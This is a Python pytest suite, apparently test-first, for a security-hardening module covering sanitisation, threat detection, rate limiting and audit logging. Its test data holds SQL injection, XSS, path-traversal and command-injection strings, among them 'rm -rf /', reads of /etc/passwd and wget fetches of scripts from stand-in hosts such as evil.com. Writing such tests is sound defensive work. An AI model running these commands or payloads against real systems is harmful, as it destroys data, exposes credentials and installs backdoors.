"""
Tests for security hardening measures and attack vector protection.

Following TDD approach:
1. RED: Write failing tests first
2. GREEN: Implement minimal code to pass tests
3. REFACTOR: Optimize and improve code quality
"""

import asyncio
import time
from datetime import datetime, timedelta
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from ..models import CacheConfig, PoolConfig
from ..security import SecurityAuditLogger, SecurityHardening, ThreatDetector


class TestSecurityHardening:
    """Test security hardening functionality."""

    @pytest.mark.asyncio
    async def test_input_validation_middleware(self, cache_config, pool_config):
        """Test input validation and sanitization middleware."""
        # This test will fail until we implement SecurityHardening
        security = SecurityHardening(cache_config, pool_config)

        # Test SQL injection prevention
        malicious_input = "'; DROP TABLE users; --"
        sanitized = await security.sanitize_input(malicious_input)
        assert "DROP TABLE" not in sanitized
        assert sanitized != malicious_input

    @pytest.mark.asyncio
    async def test_xss_prevention(self, cache_config, pool_config):
        """Test XSS attack prevention."""
        security = SecurityHardening(cache_config, pool_config)

        # Test script tag removal
        xss_input = "<script>alert('xss')</script>Hello"
        sanitized = await security.sanitize_input(xss_input)
        assert "<script>" not in sanitized
        assert "alert" not in sanitized
        assert "Hello" in sanitized

    @pytest.mark.asyncio
    async def test_command_injection_prevention(self, cache_config, pool_config):
        """Test command injection prevention."""
        security = SecurityHardening(cache_config, pool_config)

        # Test command injection patterns
        malicious_commands = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget malicious.com/script.sh",
            "`whoami`",
        ]

        for cmd in malicious_commands:
            sanitized = await security.sanitize_input(cmd)
            assert not any(char in sanitized for char in [";", "|", "&", "`"])

    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self, cache_config, pool_config):
        """Test path traversal attack prevention."""
        security = SecurityHardening(cache_config, pool_config)

        # Test directory traversal patterns
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

        for attempt in traversal_attempts:
            sanitized = await security.sanitize_path(attempt)
            assert ".." not in sanitized
            assert not sanitized.startswith("/etc/")
            assert not sanitized.startswith("\\windows\\")

    @pytest.mark.asyncio
    async def test_rate_limiting_integration(self, cache_config, pool_config):
        """Test integration with rate limiting for DDoS protection."""
        security = SecurityHardening(cache_config, pool_config)

        # Simulate rapid requests from same IP
        client_ip = "192.168.1.100"

        # First few requests should be allowed
        for i in range(5):
            allowed = await security.check_rate_limit(client_ip)
            assert allowed is True

        # Subsequent requests should be blocked
        for i in range(10):
            allowed = await security.check_rate_limit(client_ip)
            # Should eventually be blocked

        # At least some requests should be blocked
        blocked_count = 0
        for i in range(20):
            allowed = await security.check_rate_limit(client_ip)
            if not allowed:
                blocked_count += 1

        assert blocked_count > 0

    @pytest.mark.asyncio
    async def test_ip_blocking_functionality(self, cache_config, pool_config):
        """Test automated IP blocking for suspicious activity."""
        security = SecurityHardening(cache_config, pool_config)

        malicious_ip = "10.0.0.1"

        # Block IP
        await security.block_ip(malicious_ip, reason="Suspicious activity")

        # Verify IP is blocked
        is_blocked = await security.is_ip_blocked(malicious_ip)
        assert is_blocked is True

        # Test request from blocked IP
        allowed = await security.check_ip_allowed(malicious_ip)
        assert allowed is False

    @pytest.mark.asyncio
    async def test_threat_detection_patterns(self, cache_config, pool_config):
        """Test threat detection for common attack patterns."""
        security = SecurityHardening(cache_config, pool_config)

        # Test various attack patterns
        attack_patterns = [
            "union select * from users",  # SQL injection
            "<img src=x onerror=alert(1)>",  # XSS
            "../../../../etc/passwd",  # Path traversal
            "wget http://evil.com/backdoor.sh",  # Command injection
        ]

        for pattern in attack_patterns:
            threat_detected = await security.detect_threat(pattern)
            assert threat_detected is True

            # Verify threat is logged
            threats = await security.get_detected_threats()
            assert len(threats) > 0

    @pytest.mark.asyncio
    async def test_security_headers_validation(self, cache_config, pool_config):
        """Test security headers validation and enforcement."""
        security = SecurityHardening(cache_config, pool_config)

        # Test required security headers
        headers = await security.get_security_headers()

        required_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy",
        ]

        for header in required_headers:
            assert header in headers
            assert headers[header] is not None

    @pytest.mark.asyncio
    async def test_authentication_bypass_prevention(self, cache_config, pool_config):
        """Test prevention of authentication bypass attempts."""
        security = SecurityHardening(cache_config, pool_config)

        # Test common auth bypass patterns
        bypass_attempts = [
            "admin'--",
            "' OR '1'='1",
            "admin' OR 1=1--",
            "'; EXEC xp_cmdshell('dir'); --",
        ]

        for attempt in bypass_attempts:
            is_safe = await security.validate_auth_input(attempt)
            assert is_safe is False

    @pytest.mark.asyncio
    async def test_session_security(self, cache_config, pool_config):
        """Test session security measures."""
        security = SecurityHardening(cache_config, pool_config)

        # Test session token generation
        token = await security.generate_secure_token()
        assert len(token) >= 32  # Minimum secure length
        assert token.isalnum() or "-" in token or "_" in token

        # Test session validation
        valid_session = await security.validate_session_token(token)
        assert valid_session is True

        # Test invalid session
        invalid_session = await security.validate_session_token("invalid_token")
        assert invalid_session is False


class TestThreatDetector:
    """Test threat detection system."""

    @pytest.mark.asyncio
    async def test_threat_detector_initialization(self):
        """Test threat detector initialization."""
        # This test will fail until we implement ThreatDetector
        detector = ThreatDetector()
        assert detector.patterns is not None
        assert detector.blocked_ips is not None

    @pytest.mark.asyncio
    async def test_sql_injection_detection(self):
        """Test SQL injection pattern detection."""
        detector = ThreatDetector()

        sql_injections = [
            "' OR 1=1--",
            "'; DROP TABLE users; --",
            "UNION SELECT * FROM passwords",
            "admin'/**/OR/**/1=1--",
        ]

        for injection in sql_injections:
            detected = await detector.detect_sql_injection(injection)
            assert detected is True

    @pytest.mark.asyncio
    async def test_xss_detection(self):
        """Test XSS attack detection."""
        detector = ThreatDetector()

        xss_attacks = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('xss')",
            "<svg onload=alert(1)>",
        ]

        for attack in xss_attacks:
            detected = await detector.detect_xss(attack)
            assert detected is True

    @pytest.mark.asyncio
    async def test_brute_force_detection(self):
        """Test brute force attack detection."""
        detector = ThreatDetector()

        client_ip = "192.168.1.50"

        # Simulate multiple failed login attempts
        for i in range(10):
            await detector.record_failed_login(client_ip)

        is_brute_force = await detector.detect_brute_force(client_ip)
        assert is_brute_force is True

    @pytest.mark.asyncio
    async def test_anomaly_detection(self):
        """Test anomaly detection in request patterns."""
        detector = ThreatDetector()

        # Record normal traffic pattern
        for i in range(100):
            await detector.record_request("192.168.1.10", size=1024, response_time=50)

        # Record anomalous traffic
        anomaly_detected = await detector.detect_anomaly(
            ip="192.168.1.10",
            request_size=1024000,  # Very large request
            response_time=5000,  # Very slow response
        )

        assert anomaly_detected is True

    @pytest.mark.asyncio
    async def test_geographic_anomaly_detection(self):
        """Test geographic anomaly detection."""
        detector = ThreatDetector()

        # Record normal geographic pattern
        await detector.record_login("user123", country="US", ip="192.168.1.20")

        # Detect login from different country within short time
        anomaly = await detector.detect_geographic_anomaly(
            user_id="user123", country="RU", ip="10.0.0.5"  # Different country
        )

        assert anomaly is True


class TestSecurityAuditLogger:
    """Test security audit logging system."""

    @pytest.mark.asyncio
    async def test_audit_logger_initialization(self):
        """Test audit logger initialization."""
        # This test will fail until we implement SecurityAuditLogger
        logger = SecurityAuditLogger()
        assert logger.log_buffer is not None

    @pytest.mark.asyncio
    async def test_security_event_logging(self):
        """Test logging of security events."""
        logger = SecurityAuditLogger()

        # Log various security events
        await logger.log_threat_detected("SQL Injection", "192.168.1.30", "' OR 1=1--")
        await logger.log_ip_blocked("192.168.1.30", "Multiple threat attempts")
        await logger.log_auth_failure("user456", "192.168.1.30", "Invalid password")

        # Verify events are logged
        events = await logger.get_security_events()
        assert len(events) >= 3

        # Check event types
        event_types = [event.event_type for event in events]
        assert "threat_detected" in event_types
        assert "ip_blocked" in event_types
        assert "auth_failure" in event_types

    @pytest.mark.asyncio
    async def test_compliance_reporting(self):
        """Test compliance reporting functionality."""
        logger = SecurityAuditLogger()

        # Log events for compliance
        await logger.log_data_access("user789", "sensitive_table", "SELECT")
        await logger.log_privilege_escalation("user789", "admin", "GRANTED")

        # Generate compliance report
        report = await logger.generate_compliance_report(
            start_date=datetime.utcnow() - timedelta(days=1), end_date=datetime.utcnow()
        )

        assert "data_access_events" in report
        assert "privilege_changes" in report
        assert report["total_events"] > 0

    @pytest.mark.asyncio
    async def test_audit_log_retention(self):
        """Test audit log retention policies."""
        logger = SecurityAuditLogger(retention_days=30)

        # Log old event
        old_event_time = datetime.utcnow() - timedelta(days=35)
        await logger.log_security_event(
            event_type="test_event", details="Old event", timestamp=old_event_time
        )

        # Log recent event
        await logger.log_security_event(event_type="test_event", details="Recent event")

        # Clean up old events
        await logger.cleanup_old_events()

        # Verify only recent events remain
        events = await logger.get_security_events()
        for event in events:
            assert event.timestamp > datetime.utcnow() - timedelta(days=30)

    @pytest.mark.asyncio
    async def test_real_time_alerting(self):
        """Test real-time security alerting."""
        logger = SecurityAuditLogger()

        # Configure alert thresholds
        await logger.set_alert_threshold("failed_logins", 5, timedelta(minutes=5))

        # Simulate multiple failed logins
        for i in range(6):
            await logger.log_auth_failure(
                f"user{i}", "192.168.1.40", "Invalid password"
            )

        # Check for alerts
        alerts = await logger.get_active_alerts()
        assert len(alerts) > 0

        failed_login_alerts = [a for a in alerts if a.alert_type == "failed_logins"]
        assert len(failed_login_alerts) > 0


class TestSecurityPerformance:
    """Test security measures performance impact."""

    @pytest.mark.asyncio
    async def test_input_sanitization_performance(self, cache_config, pool_config):
        """Test performance impact of input sanitization."""
        security = SecurityHardening(cache_config, pool_config)

        # Test with various input sizes
        test_inputs = [
            "a" * 100,  # Small input
            "a" * 1000,  # Medium input
            "a" * 10000,  # Large input
        ]

        for test_input in test_inputs:
            start_time = time.time()

            # Perform multiple sanitizations
            for _ in range(100):
                await security.sanitize_input(test_input)

            end_time = time.time()
            avg_time = (end_time - start_time) / 100 * 1000  # ms per operation

            # Should complete within reasonable time
            assert avg_time < 10.0  # 10ms max per sanitization

    @pytest.mark.asyncio
    async def test_threat_detection_performance(self):
        """Test threat detection performance under load."""
        detector = ThreatDetector()

        test_patterns = [
            "normal user input",
            "' OR 1=1--",
            "<script>alert('xss')</script>",
            "../../../../etc/passwd",
        ]

        start_time = time.time()

        # Test concurrent threat detection
        tasks = []
        for _ in range(1000):
            for pattern in test_patterns:
                task = detector.detect_threat(pattern)
                tasks.append(task)

        await asyncio.gather(*tasks)

        end_time = time.time()
        total_time = end_time - start_time

        # Should handle 4000 detections within reasonable time
        assert total_time < 5.0  # 5 seconds max

    @pytest.mark.asyncio
    async def test_security_logging_performance(self):
        """Test security logging performance impact."""
        logger = SecurityAuditLogger()

        start_time = time.time()

        # Log many security events concurrently
        tasks = []
        for i in range(1000):
            task = logger.log_security_event(
                event_type="performance_test",
                details=f"Test event {i}",
                ip_address="192.168.1.100",
            )
            tasks.append(task)

        await asyncio.gather(*tasks)

        end_time = time.time()
        total_time = end_time - start_time

        # Should log 1000 events within reasonable time
        assert total_time < 3.0  # 3 seconds max

        # Verify all events were logged
        events = await logger.get_security_events()
        performance_events = [e for e in events if e.event_type == "performance_test"]
        assert len(performance_events) == 1000
